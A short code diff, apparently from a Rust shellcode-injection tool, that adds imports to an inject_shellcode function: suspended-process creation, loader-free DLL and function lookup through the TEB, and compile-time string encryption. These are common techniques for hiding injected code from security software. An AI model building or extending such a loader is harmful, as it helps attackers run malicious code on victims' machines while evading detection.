@@ -1,7 +1,13 @@
 pub use winapi;
 use winapi::um::{processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA}, winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS}};
 
+use NtCreateUserProcess_rs::CreateSuspendedProcess;
+use noldr::{get_dll_address, get_function_address, get_teb};
+
 mod func;
+#[macro_use]
+extern crate litcrypt;
+use_litcrypt!();
 
 pub fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<(), String> {
     // Format the process path
